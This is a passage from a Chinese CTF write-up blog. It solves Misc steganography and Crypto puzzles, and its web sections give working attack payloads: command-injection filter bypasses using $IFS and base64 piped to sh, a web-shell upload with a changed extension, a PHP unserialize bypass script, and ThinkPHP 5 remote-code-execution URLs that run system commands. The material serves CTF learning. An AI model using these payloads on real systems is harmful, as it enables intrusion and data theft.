print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出，这个是过滤了许多标点，空格，bash,包括flag的贪婪匹配<br>绕过方法可以使用变量拼接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat<span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200709234903375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>当然还有其他的方式，就不一一演示了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?ip=127.0.0.1;<span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-d|sh绕过bash，使用sh同样可行</span><br><span class="line">/?ip=127.0.0.1;cat<span class="variable">$IFS</span>`ls`<span class="comment">#内联执行的做法：</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h2><p>信息就是：两张图片，还有题目描述，不过我没发现这个有什么作用。<br>文件中隐藏了压缩包，foremost分离得到压缩包，尝试进行爆破<br><img src="https://img-blog.csdnimg.cn/20200706164411565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>得到文件中是一串base64编码，而且文件名也说明了就是beisi</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09</span><br><span class="line">YTJsc2JHVnljWFZsWlc0PQ==</span><br><span class="line">a2lsbGVycXVlZW4=</span><br><span class="line">killerqueen</span><br></pre></td></tr></table></figure><p>一直解下去就得到了最终结果。<br>然后提交了发现不对。😅<br><img src="https://img-blog.csdnimg.cn/20200706173012625.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后看了眼wp，好像是outguess<br><img src="https://img-blog.csdnimg.cn/20200706180403747.png" alt="m0re" loading="lazy"><br>桌面生成的hidden.txt打开就是flag了<br>以后要多长个心眼了。</p><h2 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h2><p>这个没什么绕的，就是一个新知识，aaencode解密<br>在线网站——🔑<a href="https://www.qtool.net/decode">传送门</a><br><img src="https://img-blog.csdnimg.cn/20200706184303704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h2><p>图片好像是没有隐藏文件的，所以先放着，看文件夹里的文件。<br>找到HTML，看源码<br><img src="https://img-blog.csdnimg.cn/2020070622394779.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这个是base32编码，就进行解密得到<br><img src="https://img-blog.csdnimg.cn/20200706224050743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>但是，这个不对。是个假的flag。还是要去看图片。’<br>图片现在能想到的就是只有LSB隐写了。<br><img src="https://img-blog.csdnimg.cn/20200706224310552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>是DES加密，看一个大佬的博客说是<code>U2FsdGVkX1</code>开头的加密基本都是DES加密。然而需要密码。<br>刚得到的假flag就是密码，看wp的时候也要仔细啊，DES和3DES也是不一样的。害我刚试了好多遍怎么都解不出来，就是不认真的结果。<br><img src="https://img-blog.csdnimg.cn/20200706230527886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_20,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="2020网鼎杯朱雀组——九宫格"><a href="#2020网鼎杯朱雀组——九宫格" class="headerlink" title="2020网鼎杯朱雀组——九宫格"></a>2020网鼎杯朱雀组——九宫格</h2><p>emmm，脚本题<br>思路：先用二维码扫描工具进行扫描，试了几个发现都是zero或者one，猜想应该是二进制什么的。这个图片很多，需要用到脚本了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zxing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">filepath = <span class="string">r&quot;#QRcode文件夹所在的绝对路径#&quot;</span></span><br><span class="line">l = os.listdir(filepath)</span><br><span class="line">l.sort(key=<span class="keyword">lambda</span> x:int(x[:<span class="number">-4</span>]))</span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    reader = zxing.BarCodeReader()</span><br><span class="line">    barcode = reader.decode(filepath+<span class="string">&quot;\\&quot;</span>+i)</span><br><span class="line">    print(barcode.parsed)</span><br><span class="line">    <span class="keyword">if</span>(barcode.parsed == <span class="string">&#x27;zero&#x27;</span>):</span><br><span class="line">        t = t + <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = t + <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        </span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200707211108475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>上面用到一个第三方库需要自己安装zxing，简单的直接使用pip安装就行。<br>然后二进制转文本，找个在线网站转一下，然后是rabbit加密<br>呃呃呃呃，不过我好像没有看到有提示，，，，百度的wp都说有提示，这道题是我在CTFhub上做的，没发现提示，然后找到个师傅的wp说是九宫格有关的，还是直接附上博客地址叭。<a href="https://www.cnblogs.com/peri0d/p/12910910.html">参考博客</a><br>然后得到flag，看过之后觉得这个需要有点脑洞的的。</p><p>本题总结：脚本比较慢，可以加上多线程，😂学的浅，目前还不会改脚本，不过多线程的确可以提快很多。还有就是这个好像是有个工具可以批量扫描二维码的，我看wp的时候有个师傅的图是批量转换的，没用脚本。不过没找到这个工具。</p><h2 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h2><p>解压，得到压缩包，再次解压，有密码，爆破得到密码，解压，无果。010editor查看，发现伪加密。(或者ZipCenOp,.jar清除伪加密，使用方法请百度。)解压得到脚本，记事本打开是python脚本。python2的，需要用2的版本进行运行。运行后发现是一堆掩码(查过百度后知道的),格式是<code>??????????.??</code>用ARCHPR进行掩码破解，参数设置百度找了好久没找到，还是自己摸索摸索。<br><img src="https://img-blog.csdnimg.cn/20200707232946147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>这样，攻击类型选择掩码，设置一下掩码选项(P:最近眼神有点不好使，总看错东西，这个是没有看到)<br>进行破解就行，数字有点大，破解的有点慢。密码：<code>1558080832.15</code><br>解压得到flag<br><img src="https://img-blog.csdnimg.cn/20200707233211438.png" alt="m0re" loading="lazy"></p><h2 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h2><p>图片，没有备注什么的，先foremost分离一下，看到两张图片，都是三明治，emmm有点不一样的，一张图里面藏了两张图。010editor看看，搜索图片位置，连接处好像有段编码。<br><img src="https://img-blog.csdnimg.cn/20200707234124920.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>像是base32，解码得到flag</p><h2 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h2><p>呃呃呃，原本没看懂啥意思，原来是需要将电脑上的日期改为发行日期就行了。也就是改成2020.9.17<br>其他没什么可说的</p><h2 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h2><p>听起来是按键音吧，之前做过这样的题，是按键音的。工具是dtmf2，下载地址可参考我之前写的博客——(CTF题记——再战GK、BUU)，或者自行百度<br><img src="https://img-blog.csdnimg.cn/20200707235816413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后根据九键键盘对照一下<br><img src="https://img-blog.csdnimg.cn/20200708000441363.png" alt="m0re" loading="lazy"><br>😂出题人还挺花心的，这么多girlfriend</p><h2 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h2><p>第一步：foremost<br>第二步：010editor<br>第三部：stegsolve<br>全都没发现任何信息😂<br><img src="https://img-blog.csdnimg.cn/20200708134037366.png" alt="m0re" loading="lazy"><br>然后仔细看图片内容，发现是摩斯密码，可以直接写出来。<br><img src="https://img-blog.csdnimg.cn/20200708134258595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>就是flag了。挺简单一道题给想多了。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="NCTF2019-Keyboard"><a href="#NCTF2019-Keyboard" class="headerlink" title="[NCTF2019]Keyboard"></a>[NCTF2019]Keyboard</h2><p>键盘密码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ooo</span> <span class="selector-tag">yyy</span> <span class="selector-tag">ii</span> <span class="selector-tag">w</span> <span class="selector-tag">uuu</span> <span class="selector-tag">ee</span> <span class="selector-tag">uuuu</span> <span class="selector-tag">yyy</span> <span class="selector-tag">uuuu</span> <span class="selector-tag">y</span> <span class="selector-tag">w</span> <span class="selector-tag">uuu</span> <span class="selector-tag">i</span> <span class="selector-tag">i</span> <span class="selector-tag">rr</span> <span class="selector-tag">w</span> <span class="selector-tag">i</span> <span class="selector-tag">i</span> <span class="selector-tag">rr</span> <span class="selector-tag">rrr</span> <span class="selector-tag">uuuu</span> <span class="selector-tag">rrr</span> <span class="selector-tag">uuuu</span> <span class="selector-tag">t</span> <span class="selector-tag">ii</span> <span class="selector-tag">uuuu</span> <span class="selector-tag">i</span> <span class="selector-tag">w</span> <span class="selector-tag">u</span> <span class="selector-tag">rrr</span> <span class="selector-tag">ee</span> <span class="selector-tag">www</span> <span class="selector-tag">ee</span> <span class="selector-tag">yyy</span> <span class="selector-tag">eee</span> <span class="selector-tag">www</span> <span class="selector-tag">w</span> <span class="selector-tag">tt</span> <span class="selector-tag">ee</span></span><br></pre></td></tr></table></figure><p>可以看出这些字母都是在键盘上的最上面那一行的。而且再往上看，是数字。一个字母对应一个数字。<code>0-9</code>，然后又是这种格式的，明显是在九键键盘上再进行解题。比第一个<code>o=9，第九个键的第三个是y</code><br><img src="https://img-blog.csdnimg.cn/2020070812283615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后用脚本继续解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee&#x27;</span></span><br><span class="line">s = <span class="string">&#x27; qwertyuiop&#x27;</span></span><br><span class="line">d = [<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;ghi&#x27;</span>, <span class="string">&#x27;jkl&#x27;</span>, <span class="string">&#x27;mno&#x27;</span>, <span class="string">&#x27;pqrs&#x27;</span>, <span class="string">&#x27;tuv&#x27;</span>, <span class="string">&#x27;wxyz&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> part <span class="keyword">in</span> cipher.split(<span class="string">&#x27; &#x27;</span>):</span><br><span class="line">    <span class="comment"># print(part)</span></span><br><span class="line">    count = len(part)</span><br><span class="line">    num = s.index(part[<span class="number">0</span>])</span><br><span class="line">    print(d[num][count - <span class="number">1</span>], end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>解出是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">youaresosmartthatthisisjustapieceofcake</span><br></pre></td></tr></table></figure><p>加上flag就行了。</p><p>总结：看到键盘密码必须要想到两种键盘，并且数字字母之间的关系要多理解。</p><h2 id="GXYCTF2019-CheckIn"><a href="#GXYCTF2019-CheckIn" class="headerlink" title="[GXYCTF2019]CheckIn"></a>[GXYCTF2019]CheckIn</h2><p>题目只有一串base64编码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==</span><br></pre></td></tr></table></figure><p>解出来是一串乱码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v)*L*_F0&lt;&#125;@H0&gt;F49023@FE0<span class="comment">#@EN</span></span><br></pre></td></tr></table></figure><p>然后就是各种密码，猜……凯撒，解不出来。<br>不知所措，Google一下大佬的wp，是rot47<br><img src="https://img-blog.csdnimg.cn/2020071015525096.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>这，，，怎么没有想到rot的其他加密，害脑洞太小。<br>思考：很乱的字符串，特别是有<code>*</code>、<code>#</code>、<code>@</code>等字符，优先考虑移位的密码。rot家族的其他成员不能忘了。</p><p>这周就这吧，不写了。玩游戏放松放松去。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————暑假计划第二周</title>
      <link href="/2020/08/23/CTF%E9%A2%98%E8%AE%B0%E2%80%94%E2%80%94%E6%9A%91%E5%81%87%E8%AE%A1%E5%88%92%E7%AC%AC%E4%BA%8C%E5%91%A8/"/>
      <url>/2020/08/23/CTF%E9%A2%98%E8%AE%B0%E2%80%94%E2%80%94%E6%9A%91%E5%81%87%E8%AE%A1%E5%88%92%E7%AC%AC%E4%BA%8C%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p>攻防世界web进阶<br>打开环境，是个上传的界面，猜想应该有过滤条件，看看源码有没有什么提示。<br><img src="https://img-blog.csdnimg.cn/20200713104748486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>好像是只能传图片，目前看到的信息只匹配后缀，但是其他的过滤，他没有说，一步一步来，先传一个正常的图片试试，<br><img src="https://img-blog.csdnimg.cn/20200713105138434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以访问到，然后就可以开始做题了。<br>先来简单的，写个一句话，然后将文件后缀改为<code>shell.jpg</code>通过抓包修改后缀，<br><img src="https://img-blog.csdnimg.cn/20200713111347604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>使用蚁剑连接<br><img src="https://img-blog.csdnimg.cn/20200713111527281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>找到了<code>flag.php</code>查看得到flag。这个是比较简单的那个上传，只过滤了后缀。<img src="https://img-blog.csdnimg.cn/20200713111925658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>攻防世界web进阶<br>php反序列化知识点，<br>审计代码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到<code>fl4g.php</code>，然后还需要注意的是下面的限制条件，看到了正则匹配。<br>编写代码，生成对象的序列化，然后进行base64编码，使用get方式提交请求。<br>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">    $A = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$b = serialize($A);</span><br><span class="line">$b = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,$b);</span><br><span class="line">$b = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,$b);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正则<br><img src="https://img-blog.csdnimg.cn/20200713134231138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>所以，要用<code>+4</code>来代替<code>4</code><br>运行得到payload，然后进行提交就可以得到flag了。<br><img src="https://img-blog.csdnimg.cn/20200713131014965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p>攻防世界web进阶<br>开启环境是这样的，也没有其他的提示，源码没什么信息，所以百度找了wp查看大佬的思路。<br><img src="https://img-blog.csdnimg.cn/20200713134405299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>emmm，了解一下这个公开漏洞去。<br>找到一份环境的源码：🍖<a href="https://github.com/vulnspy/thinkphp-5.1.29">https://github.com/vulnspy/thinkphp-5.1.29</a><br>主要代码：<code>html\thinkphp\library\think\Request.php</code><br><img src="https://img-blog.csdnimg.cn/20200713140605864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="more" loading="lazy"><br>ThinkPHP用于处理HTTP请求的Request类中，其中的method方法用于获取当前的请求类型。<br>以后学到docker了自己搭一个玩玩。总得来说有点迷，以后复现一下漏洞可能会好一点。<br>直接看大佬的解题姿势;<br>payload1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:30775/?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200713141708354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以查看到phpinfo，漏洞是一个命令执行漏洞，所以可以有多种做法。</p><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>可以执行一些终端命令，所以可以慢慢找flag，这个是一种。<br>使用ls命令一级一级向上查，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200713142159768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看上一级</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../../../</span><br></pre></td></tr></table></figure><p>找到了flag文件<br><img src="https://img-blog.csdnimg.cn/20200713142437691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>查看这个文件使用cat命令，当然对linux命令熟悉的也可以使用其他的，像more这样，应该都可以的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20../../../flag</span><br></pre></td></tr></table></figure><p>就可以看到flag了。</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p>直接查看到flag，find命令查找flag的位置<br><code>find / -name &quot;*flag*&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 